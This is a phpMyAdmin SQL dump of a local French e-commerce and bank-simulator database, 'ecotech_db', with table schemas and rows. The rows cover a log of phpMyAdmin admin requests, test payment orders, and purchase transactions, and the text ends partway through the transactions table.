-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1:3306
-- Généré le : sam. 11 avr. 2026 à 22:01
-- Version du serveur : 9.1.0
-- Version de PHP : 8.3.14

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `ecotech_db`
--

-- --------------------------------------------------------

--
-- Structure de la table `api_monitor_logs`
--

DROP TABLE IF EXISTS `api_monitor_logs`;
CREATE TABLE IF NOT EXISTS `api_monitor_logs` (
  `id` int NOT NULL AUTO_INCREMENT,
  `method` varchar(10) DEFAULT NULL,
  `endpoint` varchar(255) DEFAULT NULL,
  `status` int DEFAULT NULL,
  `duration` float DEFAULT NULL,
  `payload` text,
  `created_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=33 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `api_monitor_logs`
--

INSERT INTO `api_monitor_logs` (`id`, `method`, `endpoint`, `status`, `duration`, `payload`, `created_at`) VALUES
(14, 'GET', '/phpmyadmin/index.php?route=/recent-table&ajax_request=1&recent_table=1&no_debug=true&_nocache=1775943468349631773&token=693b58563e4f57773027454967703977', 200, 39.99, '', '2026-04-11 21:37:48'),
(15, 'GET', '/phpmyadmin/index.php?route=/table/sql&db=ecotech_db&table=api_monitor_logs&ajax_request=true&ajax_page_request=true&_nocache=177594347738589455&token=693b58563e4f57773027454967703977', 200, 88.01, '', '2026-04-11 21:37:57'),
(13, 'POST', '/phpmyadmin/index.php?route=/table/delete/rows', 200, 123.43, 'ajax_request=true&ajax_page_request=true&db=ecotech_db&table=api_monitor_logs&selected%5B0%5D=%60api_monitor_logs%60.%60id%60+%3D+1&selected%5B1%5D=%60api_monitor_logs%60.%60id%60+%3D+2&selected%5B2%5D=%60api_monitor_logs%60.%60id%60+%3D+3&original_sql_query=SELECT+*+FROM+%60api_monitor_logs%60&fk_checks=0&token=693b58563e4f57773027454967703977&fk_checks=1&mult_btn=Oui&_nocache=1775943468158672987&token=693b58563e4f57773027454967703977', '2026-04-11 21:37:48'),
(4, 'GET', '/phpmyadmin/index.php?route=/sql&pos=0&db=ecotech_db&table=api_monitor_logs', 200, 187.41, '', '2026-04-11 21:37:39'),
(5, 'GET', '/phpmyadmin/js/messages.php?l=fr&v=5.2.1', 200, 73.51, '', '2026-04-11 21:37:39'),
(6, 'POST', '/phpmyadmin/index.php?route=/navigation&ajax_request=1', 200, 127.41, 'reload=true&no_debug=true&server=1&n0_aPath=cm9vdA%3D%3D.ZWNvdGVjaF9kYg%3D%3D.dGFibGVz&n0_vPath=cm9vdA%3D%3D.ZWNvdGVjaF9kYg%3D%3D.VGFibGVz&n0_pos2_name=tables&n0_pos2_value=0&_nocache=1775943459840119504&token=693b58563e4f57773027454967703977', '2026-04-11 21:37:39'),
(7, 'GET', '/phpmyadmin/index.php?route=/recent-table&ajax_request=1&recent_table=1&no_debug=true&_nocache=1775943459855962617&token=693b58563e4f57773027454967703977', 200, 208, '', '2026-04-11 21:37:40'),
(8, 'POST', '/phpmyadmin/index.php?route=/config/get', 200, 341.68, 'ajax_request=true&server=1&key=NavigationWidth&_nocache=1775943459838801318&token=693b58563e4f57773027454967703977', '2026-04-11 21:37:40'),
(9, 'POST', '/phpmyadmin/index.php?route=/config/get', 200, 505.83, 'ajax_request=true&server=1&key=Console&_nocache=177594345984381639&token=693b58563e4f57773027454967703977', '2026-04-11 21:37:40'),
(10, 'POST', '/phpmyadmin/index.php?route=/config/set', 200, 44.16, 'ajax_request=true&key=Console%2FMode&server=1&value=%22collapse%22&_nocache=1775943460405706782&token=693b58563e4f57773027454967703977', '2026-04-11 21:37:40'),
(11, 'POST', '/phpmyadmin/index.php?route=/table/delete/confirm', 200, 144.79, 'db=ecotech_db&table=api_monitor_logs&token=693b58563e4f57773027454967703977&goto=index.php%3Froute%3D%2Fsql&url-remove-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%26sql_signature%3D73093635dfa31b5771fed003b722319d9b8062c3e98e84ebe148ada86164e99e%26session_max_rows%3D25%26is_browse_distinct%3D0%26discard_remembered_sort%3D1&url-add-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%2B%2B%250AORDER%2BBY%2B%2560api_monitor_logs%2560.%2560id%2560%2BASC%26sql_signature%3D894ff7f6c5b121c705c06c715667a2138e1a3c6a1bbc5629855c12817fb3e76d%26session_max_rows%3D25%26is_browse_distinct%3D0&url-remove-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%26sql_signature%3D73093635dfa31b5771fed003b722319d9b8062c3e98e84ebe148ada86164e99e%26session_max_rows%3D25%26is_browse_distinct%3D0%26discard_remembered_sort%3D1&url-add-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%2B%2B%250AORDER%2BBY%2B%2560api_monitor_logs%2560.%2560method%2560%2BASC%26sql_signature%3D77334a1b5f76d73ff2cd2cd8ece00f18745588d4319d6ba72adc32b91bbc954e%26session_max_rows%3D25%26is_browse_distinct%3D0&url-remove-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%26sql_signature%3D73093635dfa31b5771fed003b722319d9b8062c3e98e84ebe148ada86164e99e%26session_max_rows%3D25%26is_browse_distinct%3D0%26discard_remembered_sort%3D1&url-add-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%2B%2B%250AORDER%2BBY%2B%2560api_monitor_logs%2560.%2560endpoint%2560%2BASC%26sql_signature%3Da4229ffd72a43014865e6f6cca0abc0b65a8054a6979a3f4247b0efbaaf59cfe%26session_max_rows%3D25%26is_browse_distinct%3D0&url-remove-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%26sql_signature%3D73093635dfa31b5771fed003b722319d9b8062c3e98e84ebe148ada86164e99e%26session_max_rows%3D25%26is_browse_distinct%3D0%26discard_remembered_sort%3D1&url-add-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%2B%2B%250AORDER%2BBY%2B%2560api_monitor_logs%2560.%2560status%2560%2BASC%26sql_signature%3D3e9b08ca6403bf7d59364f5d5abd8449cef43bc3c0aa2c35d2f93ef7673b4f76%26session_max_rows%3D25%26is_browse_distinct%3D0&url-remove-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%26sql_signature%3D73093635dfa31b5771fed003b722319d9b8062c3e98e84ebe148ada86164e99e%26session_max_rows%3D25%26is_browse_distinct%3D0%26discard_remembered_sort%3D1&url-add-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%2B%2B%250AORDER%2BBY%2B%2560api_monitor_logs%2560.%2560duration%2560%2BASC%26sql_signature%3D37dedc93d2bb35f11546bfacaa708b0b59c46faa8bf2087f61d68b0999090b42%26session_max_rows%3D25%26is_browse_distinct%3D0&url-remove-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%26sql_signature%3D73093635dfa31b5771fed003b722319d9b8062c3e98e84ebe148ada86164e99e%26session_max_rows%3D25%26is_browse_distinct%3D0%26discard_remembered_sort%3D1&url-add-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%2B%2B%250AORDER%2BBY%2B%2560api_monitor_logs%2560.%2560payload%2560%2BASC%26sql_signature%3D099de1c832db856be7b34298d3cf3e7c7adbf96f33d38b5017ba65af66c46f73%26session_max_rows%3D25%26is_browse_distinct%3D0&url-remove-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%26sql_signature%3D73093635dfa31b5771fed003b722319d9b8062c3e98e84ebe148ada86164e99e%26session_max_rows%3D25%26is_browse_distinct%3D0%26discard_remembered_sort%3D1&url-add-order=index.php%3Froute%3D%2Fsql%26db%3Decotech_db%26table%3Dapi_monitor_logs%26sql_query%3DSELECT%2B%252A%2BFROM%2B%2560api_monitor_logs%2560%2B%2B%250AORDER%2BBY%2B%2560api_monitor_logs%2560.%2560created_at%2560%2BDESC%26sql_signature%3D0138f6be2009f1311ea31e4288754e812ecd230caeb0fd83aeed6279f9646534%26session_max_rows%3D25%26is_browse_distinct%3D0&rows_to_delete%5B0%5D=%60api_monitor_logs%60.%60id%60+%3D+1&rows_to_delete%5B1%5D=%60api_monitor_logs%60.%60id%60+%3D+2&rows_to_delete%5B2%5D=%60api_monitor_logs%60.%60id%60+%3D+3&clause_is_unique=1&sql_query=SELECT+*+FROM+%60api_monitor_logs%60&ajax_request=true&ajax_page_request=true&&_nocache=1775943466400960385&token=693b58563e4f57773027454967703977', '2026-04-11 21:37:46'),
(12, 'GET', '/phpmyadmin/index.php?route=/recent-table&ajax_request=1&recent_table=1&no_debug=true&_nocache=177594346659786588&token=693b58563e4f57773027454967703977', 200, 25.28, '', '2026-04-11 21:37:46'),
(16, 'GET', '/phpmyadmin/index.php?route=/recent-table&ajax_request=1&recent_table=1&no_debug=true&_nocache=1775943477516681031&token=693b58563e4f57773027454967703977', 200, 27.1, '', '2026-04-11 21:37:57'),
(17, 'POST', '/phpmyadmin/index.php?route=/lint', 200, 69.54, 'sql_query=SELECT+*+FROM+%60api_monitor_logs%60+WHERE+1&server=1&no_history=true&_nocache=1775943477520829590&token=693b58563e4f57773027454967703977', '2026-04-11 21:37:57'),
(18, 'POST', '/phpmyadmin/index.php?route=/database/sql/autocomplete', 200, 148.96, 'ajax_request=true&server=1&db=ecotech_db&no_debug=true&_nocache=1775943481086680890&token=693b58563e4f57773027454967703977', '2026-04-11 21:38:01'),
(19, 'POST', '/phpmyadmin/index.php?route=/lint', 200, 37.02, 'sql_query=TRUNCATE+TABLE+ecotech_notifications%3B&server=1&no_history=true&_nocache=1775943481600303396&token=693b58563e4f57773027454967703977', '2026-04-11 21:38:01'),
(20, 'POST', '/phpmyadmin/index.php?route=/import', 200, 149.74, 'db=ecotech_db&table=api_monitor_logs&token=693b58563e4f57773027454967703977&is_js_confirmed=1&pos=0&goto=index.php%3Froute%3D%2Ftable%2Fsql&message_to_show=La+requ%C3%AAte+SQL+a+%C3%A9t%C3%A9+ex%C3%A9cut%C3%A9e+avec+succ%C3%A8s.&prev_sql_query=SELECT+*+FROM+%60api_monitor_logs%60+WHERE+1&sql_query=TRUNCATE+TABLE+ecotech_notifications%3B&sql_delimiter=%3B&fk_checks=0&fk_checks=1&SQL=Ex%C3%A9cuter&ajax_request=true&ajax_page_request=true&_nocache=1775943484512231576&token=693b58563e4f57773027454967703977', '2026-04-11 21:38:04'),
(21, 'GET', '/phpmyadmin/index.php?route=/table/export&db=ecotech_db&table=api_monitor_logs&single_table=true&ajax_request=true&ajax_page_request=true&_nocache=1775943489403693629&token=693b58563e4f57773027454967703977', 200, 246.29, '', '2026-04-11 21:38:09'),
(22, 'GET', '/phpmyadmin/index.php?route=/recent-table&ajax_request=1&recent_table=1&no_debug=true&_nocache=1775943489709912954&token=693b58563e4f57773027454967703977', 200, 26.96, '', '2026-04-11 21:38:09'),
(23, 'GET', '/phpmyadmin/index.php?route=/database/structure&db=ecotech_db&ajax_request=true&ajax_page_request=true&_nocache=1775943494075649563&token=693b58563e4f57773027454967703977', 200, 180.39, '', '2026-04-11 21:38:14'),
(24, 'GET', '/phpmyadmin/index.php?route=/database/export&db=ecotech_db&ajax_request=true&ajax_page_request=true&_nocache=1775943496156890868&token=693b58563e4f57773027454967703977', 200, 75.59, '', '2026-04-11 21:38:16'),
(25, 'POST', '/phpmyadmin/index.php?route=/export', 200, 615.34, 'db=ecotech_db&table=&export_type=database&export_method=quick&template_id=&token=693b58563e4f57773027454967703977&quick_or_custom=quick&what=sql&structure_or_data_forced=0&table_select%5B%5D=api_monitor_logs&table_structure%5B%5D=api_monitor_logs&table_data%5B%5D=api_monitor_logs&table_select%5B%5D=api_orders&table_structure%5B%5D=api_orders&table_data%5B%5D=api_orders&table_select%5B%5D=banktransactions&table_structure%5B%5D=banktransactions&table_data%5B%5D=banktransactions&table_select%5B%5D=ecotechbank&table_structure%5B%5D=ecotechbank&table_data%5B%5D=ecotechbank&table_select%5B%5D=ecotechparnier&table_structure%5B%5D=ecotechparnier&table_data%5B%5D=ecotechparnier&table_select%5B%5D=ecotechperiphs&table_structure%5B%5D=ecotechperiphs&table_data%5B%5D=ecotechperiphs&table_select%5B%5D=ecotechstock&table_structure%5B%5D=ecotechstock&table_data%5B%5D=ecotechstock&table_select%5B%5D=ecotechstock_periphs&table_structure%5B%5D=ecotechstock_periphs&table_data%5B%5D=ecotechstock_periphs&table_select%5B%5D=ecotechstock_sons&table_structure%5B%5D=ecotechstock_sons&table_data%5B%5D=ecotechstock_sons&table_select%5B%5D=ecotechstock_tel&table_structure%5B%5D=ecotechstock_tel&table_data%5B%5D=ecotechstock_tel&table_select%5B%5D=ecotechstock_tv&table_structure%5B%5D=ecotechstock_tv&table_data%5B%5D=ecotechstock_tv&table_select%5B%5D=ecotech_admins&table_structure%5B%5D=ecotech_admins&table_data%5B%5D=ecotech_admins&table_select%5B%5D=ecotech_commandes&table_structure%5B%5D=ecotech_commandes&table_data%5B%5D=ecotech_commandes&table_select%5B%5D=ecotech_customer_messages&table_structure%5B%5D=ecotech_customer_messages&table_data%5B%5D=ecotech_customer_messages&table_select%5B%5D=ecotech_employes&table_structure%5B%5D=ecotech_employes&table_data%5B%5D=ecotech_employes&table_select%5B%5D=ecotech_feedbacks&table_structure%5B%5D=ecotech_feedbacks&table_data%5B%5D=ecotech_feedbacks&table_select%5B%5D=ecotech_info_messages&table_structure%5B%5D=ecotech_info_messages&table_data%5B%5D=ecotech_info_messages&table_select%5B%5D=ecotech_notifications&table_structure%5B%5D=ecotech_notifications&table_data%5B%5D=ecotech_notifications&table_select%5B%5D=ecotech_sales_messages&table_structure%5B%5D=ecotech_sales_messages&table_data%5B%5D=ecotech_sales_messages&table_select%5B%5D=merchants&table_structure%5B%5D=merchants&table_data%5B%5D=merchants&table_select%5B%5D=produit&table_structure%5B%5D=produit&table_data%5B%5D=produit&table_select%5B%5D=promos&table_structure%5B%5D=promos&table_data%5B%5D=promos&table_select%5B%5D=sons&table_structure%5B%5D=sons&table_data%5B%5D=sons&table_select%5B%5D=telephone&table_structure%5B%5D=telephone&table_data%5B%5D=telephone&table_select%5B%5D=televisions&table_structure%5B%5D=televisions&table_data%5B%5D=televisions&table_select%5B%5D=users&table_structure%5B%5D=users&table_data%5B%5D=users&table_select%5B%5D=vue_stock_pc&table_structure%5B%5D=vue_stock_pc&table_data%5B%5D=vue_stock_pc&table_select%5B%5D=vue_stock_periph&table_structure%5B%5D=vue_stock_periph&table_data%5B%5D=vue_stock_periph&table_select%5B%5D=vue_stock_son&table_structure%5B%5D=vue_stock_son&table_data%5B%5D=vue_stock_son&table_select%5B%5D=vue_stock_tel&table_structure%5B%5D=vue_stock_tel&table_data%5B%5D=vue_stock_tel&table_select%5B%5D=vue_stock_tv&table_structure%5B%5D=vue_stock_tv&table_data%5B%5D=vue_stock_tv&aliases_new=&output_format=sendit&filename_template=%40DATABASE%40&remember_template=on&charset=utf-8&compression=none&maxsize=&codegen_structure_or_data=data&codegen_format=0&csv_separator=%2C&csv_enclosed=%22&csv_escaped=%22&csv_terminated=AUTO&csv_null=NULL&csv_columns=something&csv_structure_or_data=data&excel_null=NULL&excel_columns=something&excel_edition=win&excel_structure_or_data=data&json_structure_or_data=data&json_unicode=something&latex_caption=something&latex_structure_or_data=structure_and_data&latex_structure_caption=Structure+de+la+table+%40TABLE%40&latex_structure_continued_caption=Structure+de+la+table+%40TABLE%40+%28suite%29&latex_structure_label=tab%3A%40TABLE%40-structure&latex_comments=something&latex_columns=something&latex_data_caption=Contenu+de+la+table+%40TABLE%40&latex_data_continued_caption=Contenu+de+la+table+%40TABLE%40+%28suite%29&latex_data_label=tab%3A%40TABLE%40-data&latex_null=%5Ctextit%7BNULL%7D&mediawiki_structure_or_data=structure_and_data&mediawiki_caption=something&mediawiki_headers=something&htmlword_structure_or_data=structure_and_data&htmlword_null=NULL&ods_null=NULL&ods_structure_or_data=data&odt_structure_or_data=structure_and_data&odt_comments=something&odt_columns=something&odt_null=NULL&pdf_report_title=&pdf_structure_or_data=structure_and_data&phparray_structure_or_data=data&sql_include_comments=something&sql_header_comment=&sql_use_transaction=something&sql_compatibility=NONE&sql_structure_or_data=structure_and_data&sql_drop_table=something&sql_create_table=something&sql_if_not_exists=something&sql_auto_increment=something&sql_create_view=something&sql_procedure_function=something&sql_create_trigger=something&sql_backquotes=something&sql_type=INSERT&sql_insert_syntax=both&sql_max_query_size=50000&sql_hex_for_binary=something&sql_utc_time=something&texytext_structure_or_data=structure_and_data&texytext_null=NULL&xml_structure_or_data=data&xml_export_events=something&xml_export_functions=something&xml_export_procedures=something&xml_export_tables=something&xml_export_triggers=something&xml_export_views=something&xml_export_contents=something&yaml_structure_or_data=data', '2026-04-11 21:38:18'),
(26, 'GET', '/phpmyadmin/index.php?route=/export/check-time-out&ajax_request=true&_nocache=1775943800316467713&token=693b58563e4f57773027454967703977', 200, 585.98, '', '2026-04-11 21:43:21'),
(27, 'GET', '/phpmyadmin/index.php?route=/database/structure&db=ecotech_db&ajax_request=true&ajax_page_request=true&_nocache=1775943865487999670&token=693b58563e4f57773027454967703977', 200, 288.76, '', '2026-04-11 21:44:25'),
(28, 'GET', '/phpmyadmin/index.php?route=/database/export&db=ecotech_db&ajax_request=true&ajax_page_request=true&_nocache=1775943866956214297&token=693b58563e4f57773027454967703977', 200, 169.32, '', '2026-04-11 21:44:27'),
(29, 'POST', '/phpmyadmin/index.php?route=/export', 200, 1026.55, 'db=ecotech_db&table=&export_type=database&export_method=quick&template_id=&token=693b58563e4f57773027454967703977&quick_or_custom=custom&what=sql&structure_or_data_forced=0&table_select%5B%5D=api_monitor_logs&table_structure%5B%5D=api_monitor_logs&table_data%5B%5D=api_monitor_logs&table_select%5B%5D=api_orders&table_structure%5B%5D=api_orders&table_data%5B%5D=api_orders&table_select%5B%5D=banktransactions&table_structure%5B%5D=banktransactions&table_data%5B%5D=banktransactions&table_select%5B%5D=ecotechbank&table_structure%5B%5D=ecotechbank&table_data%5B%5D=ecotechbank&table_select%5B%5D=ecotechparnier&table_structure%5B%5D=ecotechparnier&table_data%5B%5D=ecotechparnier&table_select%5B%5D=ecotechperiphs&table_structure%5B%5D=ecotechperiphs&table_data%5B%5D=ecotechperiphs&table_select%5B%5D=ecotechstock&table_structure%5B%5D=ecotechstock&table_data%5B%5D=ecotechstock&table_select%5B%5D=ecotechstock_periphs&table_structure%5B%5D=ecotechstock_periphs&table_data%5B%5D=ecotechstock_periphs&table_select%5B%5D=ecotechstock_sons&table_structure%5B%5D=ecotechstock_sons&table_data%5B%5D=ecotechstock_sons&table_select%5B%5D=ecotechstock_tel&table_structure%5B%5D=ecotechstock_tel&table_data%5B%5D=ecotechstock_tel&table_select%5B%5D=ecotechstock_tv&table_structure%5B%5D=ecotechstock_tv&table_data%5B%5D=ecotechstock_tv&table_select%5B%5D=ecotech_admins&table_structure%5B%5D=ecotech_admins&table_data%5B%5D=ecotech_admins&table_select%5B%5D=ecotech_commandes&table_structure%5B%5D=ecotech_commandes&table_data%5B%5D=ecotech_commandes&table_select%5B%5D=ecotech_customer_messages&table_structure%5B%5D=ecotech_customer_messages&table_data%5B%5D=ecotech_customer_messages&table_select%5B%5D=ecotech_employes&table_structure%5B%5D=ecotech_employes&table_data%5B%5D=ecotech_employes&table_select%5B%5D=ecotech_feedbacks&table_structure%5B%5D=ecotech_feedbacks&table_data%5B%5D=ecotech_feedbacks&table_select%5B%5D=ecotech_info_messages&table_structure%5B%5D=ecotech_info_messages&table_data%5B%5D=ecotech_info_messages&table_select%5B%5D=ecotech_notifications&table_structure%5B%5D=ecotech_notifications&table_data%5B%5D=ecotech_notifications&table_select%5B%5D=ecotech_sales_messages&table_structure%5B%5D=ecotech_sales_messages&table_data%5B%5D=ecotech_sales_messages&table_select%5B%5D=merchants&table_structure%5B%5D=merchants&table_data%5B%5D=merchants&table_select%5B%5D=produit&table_structure%5B%5D=produit&table_data%5B%5D=produit&table_select%5B%5D=promos&table_structure%5B%5D=promos&table_data%5B%5D=promos&table_select%5B%5D=sons&table_structure%5B%5D=sons&table_data%5B%5D=sons&table_select%5B%5D=telephone&table_structure%5B%5D=telephone&table_data%5B%5D=telephone&table_select%5B%5D=televisions&table_structure%5B%5D=televisions&table_data%5B%5D=televisions&table_select%5B%5D=users&table_structure%5B%5D=users&table_data%5B%5D=users&table_select%5B%5D=vue_stock_pc&table_structure%5B%5D=vue_stock_pc&table_data%5B%5D=vue_stock_pc&table_select%5B%5D=vue_stock_periph&table_structure%5B%5D=vue_stock_periph&table_data%5B%5D=vue_stock_periph&table_select%5B%5D=vue_stock_son&table_structure%5B%5D=vue_stock_son&table_data%5B%5D=vue_stock_son&table_select%5B%5D=vue_stock_tel&table_structure%5B%5D=vue_stock_tel&table_data%5B%5D=vue_stock_tel&table_select%5B%5D=vue_stock_tv&table_structure%5B%5D=vue_stock_tv&table_data%5B%5D=vue_stock_tv&aliases_new=&output_format=sendit&filename_template=%40DATABASE%40&remember_template=on&charset=utf-8&compression=none&maxsize=&codegen_structure_or_data=data&codegen_format=0&csv_separator=%2C&csv_enclosed=%22&csv_escaped=%22&csv_terminated=AUTO&csv_null=NULL&csv_columns=something&csv_structure_or_data=data&excel_null=NULL&excel_columns=something&excel_edition=win&excel_structure_or_data=data&json_structure_or_data=data&json_unicode=something&latex_caption=something&latex_structure_or_data=structure_and_data&latex_structure_caption=Structure+de+la+table+%40TABLE%40&latex_structure_continued_caption=Structure+de+la+table+%40TABLE%40+%28suite%29&latex_structure_label=tab%3A%40TABLE%40-structure&latex_comments=something&latex_columns=something&latex_data_caption=Contenu+de+la+table+%40TABLE%40&latex_data_continued_caption=Contenu+de+la+table+%40TABLE%40+%28suite%29&latex_data_label=tab%3A%40TABLE%40-data&latex_null=%5Ctextit%7BNULL%7D&mediawiki_structure_or_data=structure_and_data&mediawiki_caption=something&mediawiki_headers=something&htmlword_structure_or_data=structure_and_data&htmlword_null=NULL&ods_null=NULL&ods_structure_or_data=data&odt_structure_or_data=structure_and_data&odt_comments=something&odt_columns=something&odt_null=NULL&pdf_report_title=&pdf_structure_or_data=structure_and_data&phparray_structure_or_data=data&sql_include_comments=something&sql_header_comment=&sql_use_transaction=something&sql_compatibility=NONE&sql_structure_or_data=structure_and_data&sql_drop_table=something&sql_create_table=something&sql_if_not_exists=something&sql_auto_increment=something&sql_create_view=something&sql_procedure_function=something&sql_create_trigger=something&sql_backquotes=something&sql_type=INSERT&sql_insert_syntax=both&sql_max_query_size=50000&sql_hex_for_binary=something&sql_utc_time=something&texytext_structure_or_data=structure_and_data&texytext_null=NULL&xml_structure_or_data=data&xml_export_events=something&xml_export_functions=something&xml_export_procedures=something&xml_export_tables=something&xml_export_triggers=something&xml_export_views=something&xml_export_contents=something&yaml_structure_or_data=data', '2026-04-11 21:48:07'),
(30, 'GET', '/phpmyadmin/index.php?route=/export/check-time-out&ajax_request=true&_nocache=1775944843833667446&token=693b58563e4f57773027454967703977', 200, 651.21, '', '2026-04-11 22:00:44'),
(31, 'GET', '/phpmyadmin/index.php?route=/database/structure&db=ecotech_db&ajax_request=true&ajax_page_request=true&_nocache=1775944898010852674&token=693b58563e4f57773027454967703977', 200, 350.56, '', '2026-04-11 22:01:38'),
(32, 'GET', '/phpmyadmin/index.php?route=/database/export&db=ecotech_db&ajax_request=true&ajax_page_request=true&_nocache=1775944899862799171&token=693b58563e4f57773027454967703977', 200, 231.18, '', '2026-04-11 22:01:40');

-- --------------------------------------------------------

--
-- Structure de la table `api_orders`
--

DROP TABLE IF EXISTS `api_orders`;
CREATE TABLE IF NOT EXISTS `api_orders` (
  `id` int NOT NULL AUTO_INCREMENT,
  `order_token` varchar(64) DEFAULT NULL,
  `buyer_id` int NOT NULL,
  `seller_id` int DEFAULT NULL,
  `amount_total` decimal(10,2) NOT NULL,
  `description` varchar(255) DEFAULT NULL,
  `status` enum('pending','success','failed') DEFAULT 'pending',
  `return_url` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `order_token` (`order_token`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `api_orders`
--

INSERT INTO `api_orders` (`id`, `order_token`, `buyer_id`, `seller_id`, `amount_total`, `description`, `status`, `return_url`, `created_at`) VALUES
(1, '1d8ce7d10805708ae021b236a9f2880d', 0, 4, 100.00, 'Achat Test Local', 'pending', 'http://localhost/simulateur_marchand/merci.php', '2026-04-09 17:14:03'),
(2, 'f165a7d5206a196288897b6a684fa2ff', 0, 4, 100.00, 'Achat Test Local', 'pending', 'http://localhost/simulateur_marchand/merci.php', '2026-04-09 17:22:10'),
(3, '6731639fe682a3c4ffe716cffe2aa30b', 0, 4, 100.00, 'Achat Test Local', 'pending', 'http://localhost/simulateur_marchand/merci.php', '2026-04-09 17:53:32'),
(4, 'ca28dc86c9ac48aee07700502212ed31', 113, 4, 100.00, 'Achat Test Local', 'success', 'http://localhost/simulateur_marchand/merci.php', '2026-04-09 17:54:19'),
(5, 'ac0e0f37b9cf83dd4e5ae8e1ef8b062a', 113, 4, 100.00, 'Achat Test Local', 'success', 'http://localhost/ecotechnologie/ecotechbank-api-fr/merci.php', '2026-04-09 18:15:45'),
(6, '5d293d2df5131bb2d6a21a9bfc4c5d3d', 112, 4, 100.00, 'Achat Test Local', 'success', 'http://localhost/ecotechnologie/ecotechbank-api-fr/merci.php', '2026-04-09 18:20:29');

-- --------------------------------------------------------

--
-- Structure de la table `banktransactions`
--

DROP TABLE IF EXISTS `banktransactions`;
CREATE TABLE IF NOT EXISTS `banktransactions` (
  `id` int NOT NULL AUTO_INCREMENT,
  `id_client` int NOT NULL,
  `description` varchar(255) NOT NULL,
  `montant` decimal(10,2) DEFAULT NULL,
  `date_transaction` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=116 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `banktransactions`
--

INSERT INTO `banktransactions` (`id`, `id_client`, `description`, `montant`, `date_transaction`) VALUES
(1, 32, 'Achat EcoTechShop', -306.00, '2026-02-15 19:04:30'),
(2, 32, 'Achat EcoTechShop', -306.00, '2026-02-16 08:57:45'),
(3, 51, 'Achat EcoTechShop', -1049.00, '2026-02-18 20:57:58'),
(4, 68, 'Achat EcoTechShop', -899.00, '2026-03-14 13:32:59'),
(5, 68, 'Achat EcoTechShop', -1846.00, '2026-03-14 16:25:06'),
(6, 68, 'Achat EcoTechShop', -2312.70, '2026-03-14 16:30:35'),
(7, 68, 'Achat EcoTechShop', -2312.70, '2026-03-14 18:13:33'),
(8, 68, 'Achat EcoTechShop', -874.30, '2026-03-14 18:16:31'),
(9, 70, 'Achat EcoTechShop', -719.20, '2026-03-14 18:19:59'),
(10, 70, 'Achat EcoTechShop (Auto-vérifié)', -719.20, '2026-03-14 18:29:34'),
(11, 70, 'Achat EcoTechShop (Auto-vérifié)', -719.20, '2026-03-14 18:31:58'),
(12, 70, 'Achat EcoTechShop (Auto-vérifié)', -719.20, '2026-03-14 18:34:01'),
(13, 70, 'Achat EcoTechShop (Auto-vérifié)', -719.20, '2026-03-14 18:35:57'),
(14, 71, 'Achat EcoTechShop (Auto-vérifié)', -857.40, '2026-03-14 20:18:40'),
(15, 71, 'Achat EcoTechShop (Auto-vérifié)', -45.00, '2026-03-14 20:19:50'),
(16, 70, 'Achat EcoTechShop (Auto-vérifié)', -719.10, '2026-03-15 11:09:46'),
(17, 68, 'Achat EcoTechShop (Auto-vérifié)', -321.40, '2026-03-17 13:25:45'),
